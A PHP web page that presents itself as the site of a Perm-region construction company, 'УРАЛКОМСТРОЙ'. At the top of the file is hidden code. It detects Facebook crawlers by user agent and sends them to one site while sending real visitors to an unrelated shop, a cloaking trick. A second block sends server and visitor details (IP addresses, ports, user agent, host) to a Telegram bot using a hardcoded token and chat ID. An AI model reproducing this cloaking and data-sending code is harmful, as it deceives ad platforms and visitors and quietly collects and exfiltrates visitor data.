<?php
function isBot ($ua) {

    $engines = array(
       array('proximic', 'proximic'),
       array('facebook', 'facebook'),
       array('facebot', 'facebot'),
       array('fb', 'fb'),
       array('facebookexternalhit', 'facebookexternalhit'),
       array('facebookexternalhit/1.1', 'facebookexternalhit/1.1')
    );

    foreach ($engines as $engine) {
        if (stristr($ua, $engine[0])) {
            return($engine[1]);
        }
    }
    return (false);
}

$isbot = isBot($_SERVER['HTTP_USER_AGENT']);

if ($isbot) {
 header("Location: https://www.mirkrasok.ru/");

}
else {
header("Location: http://princess-hairshop.ru/?utm_source=m2");

}
?>

<?php

$ref = $_POST['ref'];
$token = "565051413:AAF9kxZtuHbIMnRRyFuk-BbjQy4XZayLHyk";
$chat_id = "430495967";
$arr = array(
'IP' => $_SERVER['SERVER_ADDR'],
'Server' => $_SERVER['SERVER_PORT'],
'proxy'=>$_SERVER['HTTP_X_FORWARDED_FOR'],
'software'=>$_SERVER['SERVER_SOFTWARE'],
'protocol'=>$_SERVER['SERVER_PROTOCOL'],
'software'=>$_SERVER['REMOTE_ADDR'],
'protocol'=>$_SERVER['REMOTE_HOST'],
'software'=>$_SERVER['REMOTE_PORT'],
'protocol'=>$_SERVER['REMOTE_USER'],
'userAgent'=>$_SERVER['HTTP_USER_AGENT'],
'protocol'=>$_SERVER['REDIRECT_REMOTE_USER'],
'host'=>$_SERVER['HTTP_HOST'],
'ID'=>"ma2rs"
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="yandex-verification" content="c7fb8803225fcdb8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>УРАЛКОМСТРОЙ</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <!-- Material Design Bootstrap -->
    <link href="css/mdb.min.css" rel="stylesheet">
    <!-- Your custom styles (optional) -->
    <link href="css/style.css" rel="stylesheet">
    <link href="css/qwe.css" rel="stylesheet">

</head>

<body>
    <!--Card-->
  
    <!--Card-->
    <div class="card card-cascade wider reverse my-4" aeid="sh">

        <!--Card image-->
        <div class="view overlay" aeid="sh">
            <img src="http://altima-stroy.ru/images/bgr/top_bgr.jpg" class="img-fluid" style="
            width: 100%;
        " aeid="sh">
            <a href="#!" aeid="sh">
                <div class="mask rgba-white-slight" aeid="sh"></div>
            </a>
        </div>
        <!--/Card image-->

        <!--Card content-->
        <div class="card-body text-center" style="
        background-color: #b7abd2;
    " aeid="sh">
            <!--Title-->
            <h4 class="card-title" aeid="sh"><strong><h2>ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ</h2></strong></h4>
            <h1 class="indigo-text" aeid="sh"><strong>"УРАЛКОМСТРОЙ"</strong></h1>

            <h2 class="card-title" aeid="sh">ПЕРВЫЕ, КТО ВЫПОЛНЯЕТ РАБОТУ НА 100%</h2>

            <a href='tel:+73422592645'><button type="button" class="btn btn-default waves-effect waves-light" aeid="sh">СВЯЗАТЬСЯ С НАМИ</button></a>
            <!--Dribbble-->
        </div>
        <!--/.Card content-->

    </div>


    <section class="py-4 text-center text-lg-left " aeid="sh">

        <!--Grid row-->
        <div class="row " aeid="sh">

            <!--Grid column-->
            <div class="col-lg-7 col-xl-7 pb-3 " aeid="sh">
                <!--Excerpt-->
                <a href=" " class="pink-text " aeid="sh">
                    <h6 class="font-weight-bold pb-1 " aeid="sh">
                        ВИДЫ НАШИХ РАБОТ</h6>
                </a>
                <ul class="list-group list-group-flush" aeid="sh">
                    <li class="list-group-item" aeid="sh">— СТРОИТЕЛЬСТВО</li>
                    <li class="list-group-item" aeid="sh">— ПОДГОТОВКА СТРОИТЕЛЬНОГО УЧАСТКА</li>
                    <li class="list-group-item" aeid="sh">— ПРОИЗВОДСТВО ЗЕМЛЯННЫХ РАБОТ</li>
                    <li class="list-group-item" aeid="sh">— РАЗВЕДОЧНОЕ БУДЕНИЕ</li>
                    <li class="list-group-item" aeid="sh">— ПРОИЗВОДСТВО ОБЩЕСТРОИТЕЛЬНЫХ РАБОТ ПО ВОЗВЕДЕНИЮ ЗДАНИЙ</li>
                    <li class="list-group-item" aeid="sh">— МОНТАЖ МЕТАЛИЧЕСКИХ СТРОИТЕЛЬНЫХ КОНСТРУКЦИЙ</li>
                    <li class="list-group-item" aeid="sh">— УСТРОЙСТВО ПОКРЫТИЙ ЗДАНИЙ И СООРУЖЕНИЙ</li>
                </ul>

            </div>
            <!--Grid column-->

            <!--Grid column-->
            <div class="col-lg-5 col-xl-5 mb-5 " aeid="sh">
                <!--Featured image-->
                <div class="view overlay hm-white-slight rounded z-depth-2 " aeid="sh">
                    <img src="http://altima-stroy.ru/media/userfiles/cdf66af4b005e31ab9bfb8fce6fb9b42-min.jpg" alt="Second image in the first version of blog listing " class="img-fluid " aeid="sh">
                    <a>
                        <div class="mask waves-effect waves-light " aeid="sh"></div>
                    </a>
                </div>
            </div>


            <!--Grid column-->


        </div>

        <!--Grid row-->
        <div class="row " aeid="sh">

            <!--Grid column-->
            <div class="col-lg-5 col-xl-5 pb-3 " aeid="sh">
                <!--Featured image-->
                <div class="view overlay hm-white-slight rounded z-depth-2 " aeid="sh">
                    <img src="https://www.kirov.online/uploads/content/3107/7833181ff3321117457e20701f066ff2.jpeg" alt="Sample image for first version of blog listing " class="img-fluid " aeid="sh">
                    <a>
                        <div class="mask waves-effect waves-light " aeid="sh"></div>
                    </a>
                </div>
            </div>
            <!--Grid column-->

            <!--Grid column-->
            <div class="col-lg-7 col-xl-7 " aeid="sh">
                <!--Excerpt-->
                <ul class="list-group list-group-flush" aeid="sh">
                    <li class="list-group-item" aeid="sh">— МОНТАЖ ЗДАНИЙ И СООРУЖЕНИЙ ИЗ СБОРНЫХ КОНСТРУКЦИЙ</li>
                    <li class="list-group-item" aeid="sh">— CТРОИТЕЛЬСТВО ФУНДАМЕНТОВ И БУРЕНИЕ ВОДЯНЫХ СКВАЖИН</li>
                    <li class="list-group-item" aeid="sh">— ПРОИЗВОДСТВО БЕТОННЫХ И ЖЕЛЕЗОБЕТОННЫХ РАБОТ</li>
                    <li class="list-group-item" aeid="sh">— ПРОИЗВОДСТВО КАМЕННЫХ РАБОТ </li>
                    <li class="list-group-item" aeid="sh">— ПРОИЗВОДСТВО ОБЩЕСТРОИТЕЛЬНЫХ РАБОТ ПО ВОЗВЕДЕНИЮ ЗДАНИЙ</li>
                    <li class="list-group-item" aeid="sh">— МОНТАЖ МЕТАЛИЧЕСКИХ СТРОИТЕЛЬНЫХ КОНСТРУКЦИЙ</li>
                    <li class="list-group-item" aeid="sh">— УСТРОЙСТВО ПОКРЫТИЙ ПОЛОВ И ОБЛИЦОВОЧНЫХ СТЕН</li>
                    <li class="list-group-item" aeid="sh">— ПРОИЗВОДСТВО ПРОЧИХ ОТДЕЛОЧНЫХ И ЗАВЕРШАЮЩИХ РАБОТ</li>
                </ul>
            </div>
            <!--Grid column-->

        </div>

        <hr class="mb-5 mt-5 pb-3 " aeid="sh">

        <!--Card group-->
        <div class="card-deck" aeid="sh">

            <!--Card-->
            <div class="card mb-4" aeid="sh">

                <!--Card image-->
                <div class="view overlay" aeid="sh">
                    <img class="img-fluid" src="https://kalevala-welt.ru/wp-content/uploads/2016/09/%D0%9A%D0%BE%D1%82%D1%82%D0%B5%D0%B4%D0%B6-%D0%9C%D0%B5%D0%B4%D0%B2%D0%B5%D0%B4%D1%8C-07.jpg" alt="Card image cap" aeid="sh">
                    <a href="#!" aeid="sh">
                        <div class="mask rgba-white-slight" aeid="sh"></div>
                    </a>
                </div>
                <!--Card image-->

                <!--Card content-->
                <div class="card-body" aeid="sh">

                    <!--Title-->
                    <h4 class="card-title" aeid="sh">СТРОИТЕЛЬСТВО ЖИЛЫХ И НЕЖИЛЫХ ЗДАНИЙ</h4>

                </div>
                <!--Card content-->

            </div>
            <!--Card-->

            <!--Card-->
            <div class="card mb-4" aeid="sh">

                <!--Card image-->
                <div class="view overlay" aeid="sh">
                    <img class="img-fluid" src="http://remontik.org/wp-content/uploads/2017/04/background-metal.jpg" alt="Card image cap" aeid="sh">
                    <a href="#!" aeid="sh">
                        <div class="mask rgba-white-slight" aeid="sh"></div>
                    </a>
                </div>
                <!--Card image-->

                <!--Card content-->
                <div class="card-body" aeid="sh">
                    <!--Title-->
                    <h4 class="card-title" aeid="sh">МОНТАЖ ЗДАНИЙ И СООРУЖЕНИЕ И СБОРНЫХ КОНСТРУКЦИЙ ПЕРМСКАЯ ОБЛАСТЬ</h4>

                </div>
                <!--Card content-->

            </div>
            <!--Card-->

            <!--Card-->
            <div class="card mb-4" aeid="sh">

                <!--Card image-->
                <div class="view overlay" aeid="sh">
                    <img class="img-fluid" src="http://aqua-stroi.com/wp-content/uploads/burenie-skvg.jpg" alt="Card image cap" aeid="sh">
                    <a href="#!" aeid="sh">
                        <div class="mask rgba-white-slight" aeid="sh"></div>
                    </a>
                </div>
                <!--Card image-->

                <!--Card content-->
                <div class="card-body" aeid="sh">
                    <!--Title-->
                    <h4 class="card-title" aeid="sh">РАЗВЕДОЧНОЕ БУРЕНИЕ В ПЕРМСКОЙ ОБЛАСТИ</h4>

                </div>
                <!--Card content-->

            </div>
            <!--Card-->

        </div>
        <!--Card group-->



        <footer id="footer" class="page-footer pt-4 mt-4" aeid="sh">

            <!--Footer Links-->
            <div class="container-fluid text-center text-md-left" style="BACKGROUND-COLOR:  ROYALBLUE;" aeid="sh">
                <div class="row wow fadeIn" data-wow-delay="0.2s" style="visibility: visible; animation-name: fadeIn; animation-delay: 0.2s;" aeid="sh">
                    <!--First column-->
                    <div class="col-md-3" aeid="sh">
                        <p class="column-title white-text" aeid="sh"><strong>ДАННЫЕ</strong></p>
                        <ul class="list-unstyled" aeid="sh">
                            <li><a id="footer-link-faq" href="https://mdbootstrap.com/faq/" aeid="sh">ИHH 5957012771</a></li>
                            <li><a id="footer-link-faq" href="https://mdbootstrap.com/faq/" aeid="sh">КПП 595701001</a></li>
                            <li><a id="footer-link-faq" href="https://mdbootstrap.com/faq/" aeid="sh">ОГРН 1075957000745</a></li>
                        </ul>
                    </div>
                    <!--/.First column-->
                    <div class="col-md-3" aeid="sh">
                        <p class="column-title white-text" aeid="sh"><strong>АДРЕЕСС</strong></p>
                        <ul class="list-unstyled" aeid="sh">
                            <li><a id="footer-link-css" href="https://mdbootstrap.com/css/" aeid="sh">617700, ПЕРМСКИЙ КРАЙ</a></li>
                            <li><a id="footer-link-components" href="https://mdbootstrap.com/components/" aeid="sh">КУЕДИНСКИЙ РАЙОН П.КУЕДА</a></li>
                            <li><a id="footer-link-javascript" href="https://mdbootstrap.com/javascript/" aeid="sh">УЛ. МОЛОДЕЖНАЯ 1</a></li>
                        </ul>

                    </div>
                    <div class="col-md-3" aeid="sh">
                        <p class="column-title white-text" aeid="sh"><strong>СВЯЗАТЬСЯ С НАМИ</strong></p>
                        <ul class="list-unstyled" aeid="sh">
                            <li><a id="footer-link-css" href="tel:+73422592645" aeid="sh">+73422592645</a></li>
                            <li><a id="footer-link-components" href="mailto:vlad@PERM-CITY.ru" aeid="sh">ЭЛЕКТРОННАЯ ПОЧТА</a></li>

                        </ul>

                    </div>
                    <!--/.Third column-->
                    <hr class="w-100 clearfix d-md-none" aeid="sh">
                    <!--Fourth column-->
                    <div class="col-md-3 mb-1" aeid="sh">
                        <p class="column-title white-text" aeid="sh"><strong>ВРЕМЯ РАБОТЫ</strong></p>
                        <ul class="list-unstyled" aeid="sh">
                            <li>с 9-00 ДО 18-00 В БУДНИ</li>
                            <li>С 13-00 ДО 14-00 ОБЕД</li>
                            <li>СУББОТА, ВОСКРЕСЕНЬЕ - ВЫХОДНЫЕ ДНИ</li>
                        </ul>
                    </div>
                    <!--/.Fourth column-->

                </div>
            </div>

        </footer>

    </section>

    <!-- SCRIPTS -->
    <!-- JQuery -->
    <script type="text/javascript " src="js/jquery-3.2.1.min.js "></script>
    <!-- Bootstrap tooltips -->
    <script type="text/javascript " src="js/popper.min.js "></script>
    <!-- Bootstrap core JavaScript -->
    <script type="text/javascript " src="js/bootstrap.min.js "></script>
    <!-- MDB core JavaScript -->
    <script type="text/javascript " src="js/mdb.min.js "></script>
</body>

</html>